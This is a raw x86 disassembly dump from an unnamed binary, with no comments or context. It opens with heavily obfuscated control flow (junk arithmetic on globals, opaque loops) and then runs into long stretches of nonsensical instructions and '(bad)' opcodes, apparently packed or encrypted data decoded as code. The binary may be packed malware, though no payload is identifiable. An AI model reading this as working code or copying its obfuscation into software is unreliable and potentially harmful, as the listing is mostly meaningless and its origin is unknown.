  416966:	mov    ebx,DWORD PTR [ebp-0x48]
  416969:	lea    edx,[ebx+edx*1+0x241fcdf]
  416970:	xor    DWORD PTR ds:0x428eab,0x519b
  41697a:	mov    DWORD PTR [ebp-0x48],edx
  41697d:	mov    edx,DWORD PTR [ebp+0x8]
  416980:	and    DWORD PTR ds:0x428eab,0x0
  41698a:	jmp    0x41699e
  41698f:	xor    ebx,ebx
  416991:	or     ebx,DWORD PTR ds:0x428eab
  416997:	inc    ebx
  416998:	mov    DWORD PTR ds:0x428eab,ebx
  41699e:	cmp    DWORD PTR ds:0x428eab,0x1b
  4169a5:	jae    0x4169e7
  4169ab:	cmp    DWORD PTR ds:0x428eab,0xb
  4169b2:	jbe    0x4169e7
  4169b8:	jmp    0x4169c8
  4169bd:	push   0x42815b
  4169c2:	call   DWORD PTR ds:0x42a9fb
  4169c8:	cmp    DWORD PTR ds:0x428eab,0xa
  4169cf:	jne    0x4169e2
  4169d5:	mov    ebx,DWORD PTR ds:0x428eab
  4169db:	inc    ebx
  4169dc:	mov    DWORD PTR ds:0x428eab,ebx
  4169e2:	jmp    0x41698f
  4169e7:	mov    ebx,0xfa5e1522
  4169ec:	or     DWORD PTR ds:0x428e7b,0x3b15
  4169f6:	sub    ebx,edx
  4169f8:	add    ebx,DWORD PTR [ebp-0x44]
  4169fb:	mov    DWORD PTR [ebp-0x44],ebx
  4169fe:	mov    edx,DWORD PTR ds:0x428e8f
  416a04:	xor    edx,DWORD PTR ds:0x428e27
  416a0a:	mov    DWORD PTR ds:0x428e8f,edx
  416a10:	mov    edx,DWORD PTR [ebp+0x8]
  416a13:	xor    edx,eax
  416a15:	add    edx,esi
  416a17:	jne    0x416767
  416a1d:	mov    DWORD PTR ds:0x428ea3,0x25d2
  416a27:	jmp    0x4191f8
  416a2c:	mov    edx,DWORD PTR [ebp-0xc]
  416a2f:	xor    ebx,ebx
  416a31:	or     ebx,DWORD PTR ds:0x428ea3
  416a37:	xor    ebx,DWORD PTR ds:0x428ea7
  416a3d:	mov    DWORD PTR ds:0x428ea3,ebx
  416a43:	sub    edx,esi
  416a45:	xor    edx,eax
  416a47:	sbb    ebx,DWORD PTR ds:0x428e87
  416a4d:	mov    DWORD PTR [ebp-0x5c],edx
  416a50:	jmp    0x418e09
  416a55:	out    0xe2,al
  416a57:	dec    edx
  416a58:	mov    dl,0x46
  416a5a:	stos   BYTE PTR es:[edi],al
  416a5b:	xchg   BYTE PTR [esi+0x2de23c83],dl
  416a61:	aaa    
  416a62:	fcom   QWORD PTR [ecx+eiz*8-0x7c7dbb07]
  416a69:	out    0x60,eax
  416a6b:	add    DWORD PTR [ebx-0x4b455c4c],0x2d
  416a72:	pusha  
  416a73:	or     al,ch
  416a75:	sub    BYTE PTR [ebx],0xcf
  416a78:	and    dh,BYTE PTR [esi]
  416a7a:	mov    BYTE PTR [ebx-0x20],cl
  416a7d:	jae    0x416a89
  416a7f:	mov    gs,WORD PTR [ebx]
  416a81:	or     edx,DWORD PTR [ebx+0x1b]
  416a84:	scas   eax,DWORD PTR es:[edi]
  416a85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a86:	sub    BYTE PTR [ebp+esi*4+0x1c56816a],cl
  416a8d:	je     0x416a6f
  416a8f:	adc    ebx,DWORD PTR [eax-0x8b07a88]
  416a95:	popf   
  416a96:	cwde   
  416a97:	iret   
  416a98:	ficom  DWORD PTR [ecx+0xb]
  416a9b:	ss retw 0xc365
  416aa0:	mov    bh,cl
  416aa2:	outs   dx,BYTE PTR ds:[esi]
  416aa3:	fs jne 0x416aa6
  416aa6:	pop    esp
  416aa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416aa8:	mov    al,ds:0xe1b9e735
  416aad:	(bad)  
  416aaf:	push   esp
  416ab0:	fidivr WORD PTR [edi]
  416ab2:	out    dx,al
  416ab3:	jl     0x416a49
  416ab5:	jp     0x416ad9
  416ab7:	iret   
  416ab8:	leave  
  416ab9:	icebp  
  416aba:	and    eax,0x13b07f3f
  416abf:	ret    
  416ac0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ac1:	ins    DWORD PTR es:[edi],dx
  416ac2:	xchg   DWORD PTR [ecx],esi
  416ac4:	gs loope 0x416a94
  416ac7:	sbb    ebp,ecx
  416ac9:	rol    BYTE PTR [edi+0x6cc49931],cl
  416acf:	dec    edx
  416ad0:	(bad)  
  416ad1:	xor    dl,BYTE PTR [ebx-0x1]
  416ad4:	aam    0x3d
  416ad6:	push   0x6c
  416ad8:	outs   dx,BYTE PTR ds:[esi]
  416ad9:	aas    
  416ada:	neg    DWORD PTR [edx-0x2d]
  416add:	into   
  416ade:	adc    eax,DWORD PTR [esi+0x616f8aee]
  416ae4:	sub    DWORD PTR [ebx+0x19832e41],edx
  416aea:	aad    0x6e
  416aec:	mov    esp,0x36228723
  416af1:	int    0x58
  416af3:	adc    DWORD PTR [esi-0x44],esi
  416af6:	push   cs
  416af7:	jae    0x416ae1
  416af9:	jecxz  0x416aa5
  416afb:	mov    ebp,0x93afb64a
  416b00:	xchg   bh,dl
  416b02:	clc    
  416b03:	cwde   
  416b04:	or     BYTE PTR [esi+0x1f653bc5],al
  416b0a:	(bad)  
  416b0b:	and    al,0x3a
  416b0d:	rcr    bl,cl
  416b0f:	test   ch,bh
  416b11:	mov    eax,ds:0xe1180539
  416b16:	and    ah,BYTE PTR [esp+esi*4]
  416b19:	inc    ebp
  416b1a:	cmp    al,0xd4
  416b1c:	or     ah,BYTE PTR [edx-0x8]
  416b1f:	es cmc 
  416b21:	fstp   QWORD PTR [ecx]
  416b23:	(bad)  
  416b24:	fucom  st(3)
  416b26:	pop    esi
  416b27:	jge    0x416ae3
  416b29:	push   edi
  416b2a:	(bad)  
  416b2b:	pop    esp
  416b2c:	jg     0x416b7c
  416b2e:	ficomp WORD PTR [ebx]
  416b30:	cdq    
  416b31:	aad    0xbe
  416b33:	pushf  
  416b34:	pusha  
  416b35:	jb     0x416b88
  416b37:	in     al,dx
  416b38:	scas   eax,DWORD PTR es:[edi]
  416b39:	mov    BYTE PTR [eax+ecx*1-0x118e6f8d],bl
  416b40:	sub    eax,0xe9e52e96
  416b45:	inc    ebx
  416b46:	jle    0x416b0d
  416b48:	mov    ah,BYTE PTR fs:[edi-0x61c1793f]
  416b4f:	outs   dx,BYTE PTR ds:[esi]
  416b50:	mov    ebx,0x12c35db1
  416b55:	mov    al,ds:0x8c0d6db4
  416b5a:	sub    esi,DWORD PTR [ebx-0x1f]
  416b5d:	mov    cl,0x26
  416b5f:	sar    bl,1
  416b61:	push   esp
  416b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b63:	out    dx,eax
  416b64:	(bad)  
  416b65:	pop    esp
  416b66:	adc    al,0x25
  416b68:	mov    edi,0xcead0109
  416b6d:	and    BYTE PTR [ebx],0x2a
  416b70:	dec    ecx
  416b71:	pop    eax
  416b72:	test   edi,esi
  416b74:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b76:	mov    al,ds:0xa2e5fd4c
  416b7b:	sbb    edx,esp
  416b7d:	inc    esp
  416b7e:	aam    0x5c
  416b80:	push   esi
  416b81:	mov    edx,0x8bea4724
  416b86:	adc    dl,BYTE PTR [edx+edi*1+0x64]
  416b8a:	nop
  416b8b:	or     ebx,DWORD PTR [edx]
  416b8d:	sub    BYTE PTR [ecx-0x3c],ch
  416b90:	mov    ebp,0x9e33a993
  416b95:	call   0xa461:0x14ebecd4
  416b9c:	push   esi
  416b9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b9e:	dec    ecx
  416b9f:	push   ds
  416ba0:	jge    0x416bf1
  416ba2:	push   esi
  416ba3:	jbe    0x416bb8
  416ba5:	jp     0x416c17
  416ba7:	mov    cl,0x13
  416ba9:	add    eax,0xc588826d
  416bae:	(bad)  
  416baf:	lock xchg ecx,eax
  416bb1:	cld    
  416bb2:	rcl    DWORD PTR [eax-0x53f293e9],1
  416bb8:	arpl   ax,dx
  416bba:	sbb    eax,0x30fbee9c
  416bbf:	cdq    
  416bc0:	shr    DWORD PTR [edi],1
  416bc2:	xor    eax,0x31d88fdb
  416bc7:	xor    al,0x65
  416bc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416bca:	out    0x4d,al
  416bcc:	ret    
  416bcd:	lods   eax,DWORD PTR ds:[esi]
  416bce:	shr    BYTE PTR [esi],0xeb
  416bd1:	arpl   WORD PTR [eax+edx*4-0x3f],bx
  416bd5:	test   eax,0x36dd3a5b
  416bda:	data16 add al,0xa
  416bdd:	adc    BYTE PTR [eax+eiz*1-0x6e],bh
  416be1:	add    DWORD PTR [ecx-0x50e0b90b],ecx
  416be7:	(bad)  
  416be8:	std    
  416be9:	cmp    DWORD PTR [edx-0x13],eax
  416bec:	enter  0xefaf,0xe8
  416bf0:	xor    edi,eax
  416bf2:	dec    ebp
  416bf3:	shr    DWORD PTR [esi+0x62cea644],0x5c
  416bfa:	adc    DWORD PTR [ecx+edi*8-0x1c],edi
  416bfe:	call   0x39db8ace
  416c03:	jmp    DWORD PTR [eax]
  416c05:	pop    eax
  416c06:	jmp    0x8e171dc1
  416c0b:	sahf   
  416c0c:	popa   
  416c0d:	inc    ebx
  416c0e:	push   ecx
  416c0f:	daa    
  416c10:	mov    eax,ds:0x9fc9897d
  416c15:	mov    esp,0x9a8254bb
  416c1a:	stc    
  416c1b:	int3   
  416c1c:	and    eax,0x90fa06bc
  416c21:	ret    0x6c24
  416c24:	xchg   ecx,eax
  416c25:	push   cs
  416c26:	out    dx,eax
  416c27:	ret    
  416c28:	mov    eax,0x1bacb16e
  416c2d:	popa   
  416c2e:	cld    
  416c2f:	jne    0x416bb9
  416c31:	mov    gs,WORD PTR gs:[eax]
  416c34:	cs in  eax,0x2e
  416c37:	pop    ss
  416c38:	sub    bh,dl
  416c3a:	call   FWORD PTR [ecx]
  416c3c:	mov    ah,0xe2
  416c3e:	mov    edx,0xfa9bb80a
  416c43:	push   es
  416c44:	add    bh,BYTE PTR [esi+edi*2+0x0]
  416c48:	fldcw  WORD PTR [ebx-0x3adfbaaa]
  416c4e:	sub    al,BYTE PTR [ebp+0x44]
  416c51:	and    esi,DWORD PTR [ebx]
  416c53:	push   es
  416c54:	imul   edx,esp,0x70bd8308
  416c5a:	int3   
  416c5b:	push   0xfffffff4
  416c5d:	scas   al,BYTE PTR es:[edi]
  416c5e:	dec    esi
  416c5f:	sub    BYTE PTR [ebx],bh
  416c61:	push   esp
  416c62:	push   esi
  416c63:	pop    ds
  416c64:	(bad)  
  416c65:	xlat   BYTE PTR ds:[ebx]
  416c66:	(bad)  
  416c67:	push   eax
  416c68:	ret    0x3aa
  416c6b:	inc    edi
  416c6c:	enter  0x57e9,0xc7
  416c70:	test   DWORD PTR [ebx+0x52],0x253a9f6
  416c77:	and    BYTE PTR [edi],ah
  416c79:	fs aad 0x8c
  416c7c:	sti    
  416c7d:	sahf   
  416c7e:	mov    ah,0x54
  416c80:	dec    ecx
  416c81:	mov    ah,0xeb
  416c83:	popa   
  416c84:	xor    bl,BYTE PTR [ecx-0x20]
  416c87:	jmp    0x1978f7a1
  416c8c:	jno    0x416cfe
  416c8e:	cli    
  416c8f:	add    al,0xa3
  416c91:	js     0x416c97
  416c93:	lods   eax,DWORD PTR ds:[esi]
  416c94:	jns    0x416cb6
  416c96:	jno    0x416caf
  416c98:	test   eax,0xb67c55fd
  416c9d:	mov    eax,ds:0xe3d6f9bc
  416ca2:	cmp    BYTE PTR ds:0xe51752fd,ah
  416ca8:	out    0x75,al
  416caa:	pop    edi
  416cab:	xor    bl,0x4a
  416cae:	stos   DWORD PTR es:[edi],eax
  416caf:	or     eax,0x775bf7a9
  416cb4:	cwde   
  416cb5:	mov    dh,0xa1
  416cb7:	xor    DWORD PTR [ebx-0x3c],esp
  416cba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cbb:	aam    0xab
  416cbd:	enter  0xf489,0x27
  416cc1:	loopne 0x416cbf
  416cc3:	inc    esi
  416cc4:	mov    eax,ds:0x8327555f
  416cc9:	inc    ecx
  416cca:	add    BYTE PTR [esi],dh
  416ccc:	and    BYTE PTR ds:0x27bed9be,dl
  416cd2:	fist   WORD PTR [esi-0x40ace779]
  416cd8:	out    dx,al
  416cd9:	mov    bh,0x71
  416cdb:	enter  0xbb00,0x5f
  416cdf:	stc    
  416ce0:	sbb    BYTE PTR [edi+eiz*1-0x25f1e58e],al
  416ce7:	xor    al,0x7f
  416ce9:	lods   al,BYTE PTR ds:[esi]
  416cea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ceb:	sub    DWORD PTR [edi+0x22],0xfffffff6
  416cef:	pushf  
  416cf0:	push   esi
  416cf1:	mov    eax,ds:0xf7b8980e
  416cf6:	xor    edx,DWORD PTR [ebx-0x58]
  416cf9:	push   ecx
  416cfa:	fst    st(0)
  416cfc:	cmp    eax,0x69588406
  416d01:	test   eax,0x4450343
  416d06:	mov    esi,0xe8c8a9fd
  416d0b:	adc    BYTE PTR [eax-0x11],bl
  416d0e:	mov    esp,0x3a87e1a3
  416d13:	mov    edi,0x68c76fb7
  416d18:	push   cs
  416d19:	aam    0x50
  416d1b:	es cld 
  416d1d:	pop    eax
  416d1e:	xor    ebp,ecx
  416d20:	retf   
  416d21:	push   edi
  416d22:	out    dx,al
  416d23:	(bad)
  416d27:	pop    esi
  416d28:	arpl   bx,sp
  416d2a:	dec    esp
  416d2b:	jge    0x416cf5
  416d2d:	ins    DWORD PTR es:[edi],dx
  416d2e:	xchg   esp,eax
  416d2f:	cwde   
  416d30:	ins    BYTE PTR es:[edi],dx
  416d31:	jle    0x416db1
  416d33:	cmp    al,0xaf
  416d35:	fwait
  416d36:	loop   0x416cc9
  416d38:	push   0x18
  416d3a:	dec    edi
  416d3b:	jo     0x416ce5
  416d3d:	add    al,0x2f
  416d3f:	push   ebx
  416d40:	(bad)  
  416d42:	push   esp
  416d43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d44:	pop    esp
  416d45:	cmp    bl,BYTE PTR [edi]
  416d47:	retf   
  416d48:	dec    ebx
  416d49:	ds sbb bl,bl
  416d4c:	stc    
  416d4d:	jmp    0x6cf1:0x5a51c4a6
  416d54:	pop    edx
  416d55:	cmc    
  416d56:	pop    esp
  416d57:	mov    ecx,0x34ae07c
  416d5c:	cmp    al,al
  416d5e:	outs   dx,BYTE PTR ds:[esi]
  416d5f:	je     0x416d64
  416d61:	mov    DWORD PTR [edx+eiz*8+0x2d],ebp
  416d65:	add    DWORD PTR [esi+0x7a633cc4],edx
  416d6b:	dec    ecx
  416d6c:	pop    ebx
  416d6d:	fsubr  DWORD PTR [ebx-0x40311d7b]
  416d73:	fiadd  WORD PTR [esp+ebx*8-0x44]
  416d77:	mov    edx,0xc87a60ad
  416d7c:	xor    DWORD PTR [eax+0x22],0x61
  416d80:	gs test edi,0xbeca5073
  416d87:	xor    eax,edx
  416d89:	adc    al,0x8e
  416d8b:	in     eax,dx
  416d8c:	shr    BYTE PTR [ecx+0x6528f8f9],0xd7
  416d93:	adc    ch,BYTE PTR [ecx+0x22]
  416d96:	inc    edi
  416d97:	jno    0x416d6d
  416d99:	stos   BYTE PTR es:[edi],al
  416d9a:	test   eax,0xa1e9a269
  416d9f:	sub    al,0x64
  416da1:	sbb    al,0xc0
  416da4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416da5:	pop    ebx
  416da6:	scas   al,BYTE PTR es:[edi]
  416da7:	repnz xlat BYTE PTR ds:[ebx]
  416da9:	add    bh,bh
  416dab:	jle    0x416df3
  416dad:	jb     0x416d7d
  416daf:	(bad)  
  416db0:	std    
  416db1:	sbb    DWORD PTR [eax-0x4d],esi
  416db4:	and    bh,BYTE PTR [ebx-0x2a]
  416db7:	ins    BYTE PTR es:[edi],dx
  416db8:	jae    0x416df9
  416dba:	jecxz  0x416e2f
  416dbc:	jbe    0x416d7c
  416dbe:	std    
  416dbf:	fldz   
  416dc1:	arpl   WORD PTR [ebp+ebx*1-0x71ab5c7e],bx
  416dc8:	xchg   BYTE PTR [edi-0x52b68fe4],dh
  416dce:	cdq    
  416dcf:	test   eax,0x16d7fffc
  416dd4:	xchg   esp,eax
  416dd5:	push   0x492539f6
  416dda:	xchg   ebx,eax
  416ddb:	(bad)  
  416ddc:	(bad)  [edx-0x70]
  416ddf:	push   esp
  416de0:	cmp    al,BYTE PTR ds:0xb6d0ca30
  416de6:	icebp  
  416de7:	ja     0x416dac
  416de9:	sbb    BYTE PTR [ebx],0xc0
  416dec:	xchg   edx,eax
  416ded:	ror    BYTE PTR [ebx+0x7c],0x78
  416df1:	rol    DWORD PTR [esi],1
  416df3:	sbb    al,0xc5
  416df5:	xchg   edi,eax
  416df6:	ret    0xc36e
  416df9:	mov    ds:0x51a5378f,eax
  416dfe:	jecxz  0x416dad
  416e00:	in     al,dx
  416e01:	jae    0x416e2c
  416e03:	les    ebp,FWORD PTR [esi-0x21]
  416e06:	and    dh,dl
  416e08:	in     al,dx
  416e09:	or     al,BYTE PTR [edi-0x59]
  416e0c:	ror    BYTE PTR [ecx],1
  416e0e:	jbe    0x416dd7
  416e10:	jp     0x416df1
  416e12:	sbb    BYTE PTR [eax-0x511077c0],bl
  416e18:	mov    edi,ebp
  416e1a:	jnp    0x416e8f
  416e1c:	ins    BYTE PTR es:[edi],dx
  416e1d:	cmp    ebp,DWORD PTR [edx+0x4d]
  416e20:	fidiv  DWORD PTR [esi]
  416e22:	cmp    esi,DWORD PTR ds:0x241d6bc9
  416e28:	and    al,0xfd
  416e2a:	xchg   ebp,eax
  416e2b:	jge    0x416e7b
  416e2d:	xchg   esp,eax
  416e2e:	push   eax
  416e2f:	jbe    0x416e9e
  416e31:	jae    0x416e6d
  416e33:	ss in  eax,dx
  416e35:	arpl   WORD PTR [eax-0x20],di
  416e38:	in     eax,0xfb
  416e3a:	dec    ebx
  416e3b:	mov    ds:0x8b3ca820,eax
  416e40:	cli    
  416e41:	int3   
  416e42:	test   eax,0xac16477
  416e47:	mov    ds:0x4407c4b9,al
  416e4c:	test   DWORD PTR [eax+0x5cd8cbe8],esi
  416e52:	mov    dl,0x5
  416e54:	repz jmp 0xd991:0x9a208a79
  416e5c:	and    edi,DWORD PTR [esi-0x46ddc278]
  416e62:	pushf  
  416e63:	xor    eax,0xc8a1f8d0
  416e68:	mov    BYTE PTR [ebx],dl
  416e6a:	idiv   BYTE PTR [edx+0x44]
  416e6d:	mov    BYTE PTR [ecx-0x28],cl
  416e70:	xchg   BYTE PTR [eax],dh
  416e72:	inc    ebx
  416e73:	mov    ecx,0xe0b44c32
  416e78:	loop   0x416e76
  416e7a:	cdq    
  416e7b:	les    ebx,FWORD PTR [ecx]
  416e7d:	and    eax,0xf0b61d37
  416e82:	mov    ds:0xa3fb341,al
  416e87:	and    DWORD PTR ds:0xd50aa8ee,0xba8c5fb6
  416e91:	rcr    DWORD PTR [edi],1
  416e93:	push   cs
  416e94:	or     BYTE PTR [edi],al
  416e96:	dec    ebp
  416e97:	clc    
  416e98:	pop    es
  416e99:	jns    0x416e64
  416e9b:	adc    cl,0xb3
  416e9e:	mov    ebx,0x8b0dd852
  416ea3:	push   eax
  416ea4:	mov    esi,0x7f78b0c3
  416ea9:	and    ah,bl
  416eab:	add    DWORD PTR [eax+ebp*8-0x24051970],0x79e5d58f
  416eb6:	sub    BYTE PTR [esi-0x3a],dl
  416eb9:	repnz push esp
  416ebb:	jg     0x416e8e
  416ebd:	out    0x44,eax
  416ebf:	sub    DWORD PTR [ebx-0x655fdb67],edi
  416ec5:	push   cs
  416ec6:	imul   esp,DWORD PTR [esi+0x4aa3b97b],0xffffffc7
  416ecd:	nop
  416ece:	out    0x19,al
  416ed0:	sar    BYTE PTR ds:[edi],0x80
  416ed4:	mov    esp,0x740b64da
  416ed9:	faddp  st(6),st
  416edb:	inc    edx
  416edc:	and    ch,BYTE PTR [eax]
  416ede:	mov    DWORD PTR [ecx+0x76f64149],esi
  416ee4:	sbb    cl,ch
  416ee6:	test   al,0xe6
  416ee8:	ins    DWORD PTR es:[edi],dx
  416ee9:	pop    ebx
  416eea:	daa    
  416eeb:	(bad)  
  416eec:	mov    ebx,0xa782226a
  416ef1:	dec    eax
  416ef2:	shr    DWORD PTR [ecx+ebp*4-0x77],1
  416ef6:	pop    edx
  416ef7:	sbb    al,BYTE PTR [esi+0x6971e20d]
  416efd:	(bad)  
  416efe:	scas   eax,DWORD PTR es:[edi]
  416eff:	jne    0x416ebc
  416f01:	les    edx,FWORD PTR [ebx+ecx*2+0x51c185a5]
  416f08:	sar    ah,1
  416f0a:	lds    edi,FWORD PTR [eax+0x11]
  416f0d:	and    ah,al
  416f0f:	ret    0xcfa0
  416f12:	lock add BYTE PTR [eax+0xb],ch
  416f16:	test   BYTE PTR [edx],bl
  416f18:	inc    esp
  416f19:	outs   dx,DWORD PTR ds:[esi]
  416f1a:	cmp    ecx,ebx
  416f1c:	adc    DWORD PTR [edx+0x70],0x1c228818
  416f23:	enter  0x875a,0x4c
  416f27:	jp     0x416f0d
  416f29:	or     BYTE PTR [ebp+0xd],dl
  416f2c:	cmp    BYTE PTR [edi],0x84
  416f2f:	mov    eax,0x934867c8
  416f34:	pop    edi
  416f35:	add    eax,0xdc733797
  416f3a:	(bad)  
  416f3b:	mov    al,ds:0xcbe33f89
  416f40:	int3   
  416f41:	sbb    eax,DWORD PTR [ebp-0x7a6292e7]
  416f47:	imul   ecx,edx,0xffffffd8
  416f4a:	pop    edx
  416f4b:	cwde   
  416f4c:	xor    edi,esp
  416f4e:	mov    ch,0x8a
  416f50:	cld    
  416f51:	stc    
  416f52:	(bad)  
  416f53:	and    BYTE PTR [ebx],ch
  416f55:	hlt    
  416f56:	xor    bh,BYTE PTR [ebp+0x45b39d89]
  416f5c:	pop    ss
  416f5d:	arpl   bp,sp
  416f5f:	test   al,0x96
  416f61:	into   
  416f62:	out    dx,al
  416f63:	push   0x28d05384
  416f68:	jge    0x416f65
  416f6a:	or     al,BYTE PTR [edx]
  416f6c:	int3   
  416f6d:	mov    BYTE PTR [edi+0x70],cl
  416f70:	mov    cl,cl
  416f72:	inc    esi
  416f74:	inc    eax
  416f75:	(bad)  
  416f76:	lea    ebp,[edi+0x3414bac4]
  416f7c:	adc    cl,bl
  416f7e:	cmp    ah,bl
  416f80:	int3   
  416f81:	jg     0x416f2d
  416f83:	into   
  416f84:	pop    ebp
  416f85:	mov    ch,0x7c
  416f87:	jns    0x416f2e
  416f89:	mov    dl,0xc6
  416f8b:	test   DWORD PTR [eax+edi*4-0x215eba7f],edi
  416f92:	repnz inc ebx
  416f94:	(bad)  
  416f95:	adc    eax,0x8acbb940
  416f9a:	xor    bl,BYTE PTR [eax+0x45c82d39]
  416fa0:	sahf   
  416fa1:	sub    dh,BYTE PTR [edx-0x28bb2feb]
  416fa7:	mov    fs,WORD PTR [esi+0x77185e30]
  416fad:	mov    edi,0x3d508604
  416fb2:	sbb    al,0xaa
  416fb4:	mov    ds:0xa47b044,al
  416fb9:	mov    esi,0x9000c497
  416fbe:	loope  0x417013
  416fc0:	(bad)  
  416fc1:	out    0x3d,eax
  416fc3:	jnp    0x416f8a
  416fc5:	and    ecx,ebx
  416fc7:	aad    0x1e
  416fc9:	cmp    al,0x57
  416fcb:	adc    DWORD PTR [ebx],esp
  416fcd:	mov    al,ds:0xbfb3fd48
  416fd2:	lods   eax,DWORD PTR ds:[esi]
  416fd3:	pop    edx
  416fd4:	mov    bh,0x88
  416fd6:	test   BYTE PTR [eax],dl
  416fd8:	ficom  DWORD PTR [ebx]
  416fda:	pop    edi
  416fdb:	stos   BYTE PTR es:[edi],al
  416fdc:	sahf   
  416fdd:	cdq    
  416fde:	sub    dl,BYTE PTR [ecx+0x262ffa19]
  416fe4:	dec    edi
  416fe5:	cmp    DWORD PTR [eax+0x63ee30fa],edx
  416feb:	and    eax,DWORD PTR [esi]
  416fed:	aas    
  416fee:	dec    ebp
  416fef:	jb     0x416fda
  416ff1:	ja     0x417041
  416ff3:	or     DWORD PTR [eax+0x2b058434],ecx
  416ff9:	fistp  DWORD PTR [esp+edi*2+0x3c4ed0f7]
  417000:	bound  esp,QWORD PTR [edi+0x765cd8ca]
  417006:	dec    ecx
  417007:	jb     0x416ff6
  417009:	add    DWORD PTR [eax+0x78],esp
  41700c:	into   
  41700d:	jle    0x416fbe
  41700f:	adc    eax,0xab3766b7
  417014:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417015:	out    0x95,eax
  417017:	inc    eax
  417018:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417019:	(bad)  
  41701a:	icebp  
  41701b:	push   0x9e9a7736
  417020:	pop    es
  417021:	enter  0x77ad,0xdb
  417025:	dec    esp
  417026:	push   ebp
  417027:	mov    ds:0x8378d6cc,eax
  41702c:	ds cwde 
  41702e:	in     al,dx
  41702f:	sbb    cl,BYTE PTR [edi+0x7667a16a]
  417035:	mov    es,WORD PTR es:[eax-0x17]
  417039:	cmp    esp,esi
  41703b:	sub    eax,0x704f37ab
  417040:	jg     0x41700d
  417042:	mov    eax,ds:0x3c593841
  417047:	mov    ebp,0x926d15e7
  41704c:	mov    dh,0x74
  41704e:	enter  0x69c3,0xb5
  417052:	mov    ah,0xb4
  417054:	sti    
  417055:	stc    
  417056:	aad    0x86
  417058:	out    dx,eax
  417059:	ins    BYTE PTR es:[edi],dx
  41705a:	dec    esp
  41705b:	(bad)  
  41705c:	sub    BYTE PTR [eax+0x7d1d92e8],bh
  417062:	mov    ds:0xe629e062,al
  417067:	ret    
  417068:	xor    ebx,DWORD PTR [esi+ebp*1+0x7b]
  41706c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41706d:	or     al,0xff
  41706f:	and    al,BYTE PTR [eax]
  417071:	push   eax
  417072:	out    dx,al
  417073:	(bad)  
  417074:	ins    DWORD PTR es:[edi],dx
  417075:	and    eax,0x44d6a47d
  41707a:	retf   
  41707b:	adc    BYTE PTR [ecx],ah
  41707d:	loope  0x41700d
  41707f:	pop    ebx
  417080:	mov    eax,edx
  417082:	jmp    FWORD PTR ds:0xea08ef41
  417088:	inc    esi
  417089:	in     al,dx
  41708a:	and    eax,0xc1e32de8
  41708f:	into   
  417090:	aad    0x46
  417092:	shl    BYTE PTR [edi+0x5c],0x73
  417096:	lea    ebp,[ebp-0x6b008c0a]
  41709c:	sahf   
  41709d:	jo     0x417111
  41709f:	dec    ecx
  4170a0:	xchg   ebp,eax
  4170a1:	jecxz  0x417028
  4170a3:	pop    ss
  4170a4:	fdivr  QWORD PTR [ebx]
  4170a6:	and    DWORD PTR [esi+esi*4],esp
  4170a9:	mov    WORD PTR [esi],cs
  4170ab:	ror    BYTE PTR [eax],1
  4170ad:	stc    
  4170ae:	imul   ebp,DWORD PTR [edi+0x7b001ce3],0x42
  4170b5:	inc    ecx
  4170b6:	aaa    
  4170b7:	in     al,0x5c
  4170b9:	test   eax,0x6887c79d
  4170be:	dec    eax
  4170bf:	push   0x14
  4170c1:	test   bl,bl
  4170c3:	retf   
  4170c4:	pop    ecx
  4170c5:	mov    ecx,0x53f38696
  4170ca:	mov    ah,0x55
  4170cc:	pop    ebp
  4170cd:	mov    dl,0x59
  4170cf:	ss sti 
  4170d1:	and    eax,DWORD PTR [ebx+0x4fc9017d]
  4170d7:	dec    esi
  4170d8:	int    0xb2
  4170da:	in     eax,0xc0
  4170dc:	div    DWORD PTR [edi+0x27]
  4170df:	mov    esp,0x1d53d873
  4170e4:	mov    gs,ebp
  4170e6:	lock test BYTE PTR [eax-0x3ae8831b],cl
  4170ed:	leave  
  4170ee:	push   0xb4a06c72
  4170f3:	daa    
  4170f4:	ins    BYTE PTR es:[edi],dx
  4170f5:	std    
  4170f6:	or     al,BYTE PTR ds:0xb3d985b9
  4170fc:	and    DWORD PTR [edx-0x5800dd52],eax
  417102:	cmp    BYTE PTR [eax-0x4e194f0b],ch
  417108:	fisubr WORD PTR [esi+0x76]
  41710b:	or     ah,BYTE PTR [edx]
  41710d:	inc    edi
  41710e:	fimul  WORD PTR [ebx-0x4fd5707e]
  417114:	jb     0x417177
  417116:	fdiv   QWORD PTR [eax]
  417118:	jbe    0x4170b5
  41711a:	mov    ebp,0xf80aa879
  41711f:	inc    ecx
  417120:	in     al,dx
  417121:	mov    dl,0xf0
  417123:	pop    edi
  417124:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417125:	adc    eax,0x14367fca
  41712a:	or     edx,ebp
  41712c:	pop    ebp
  41712d:	clc    
  41712e:	or     al,bl
  417130:	retf   
  417131:	ds inc edx
  417133:	cmp    bl,al
  417135:	mov    DWORD PTR [ebp+0x37],eax
  417138:	sar    ch,1
  41713a:	add    edi,ebx
  41713c:	jecxz  0x417112
  41713e:	push   edi
  41713f:	jecxz  0x417174
  417141:	stos   DWORD PTR es:[edi],eax
  417142:	repz fild DWORD PTR [ecx]
  417145:	sub    cl,BYTE PTR [esp-0x8cb051c]
  41714c:	les    ebp,FWORD PTR [esi-0x4f07df4c]
  417152:	jne    0x41712c
  417154:	retf   
  417155:	lea    esp,[edx]
  417157:	test   al,0x6d
  417159:	adc    al,0x97
  41715b:	into   
  41715c:	pusha  
  41715d:	inc    edx
  41715e:	jnp    0x417192
  417160:	scas   eax,DWORD PTR es:[edi]
  417161:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417162:	sub    BYTE PTR [edi],ah
  417164:	mov    bh,0x8a
  417166:	xchg   DWORD PTR [ebx-0x3b22600d],ebx
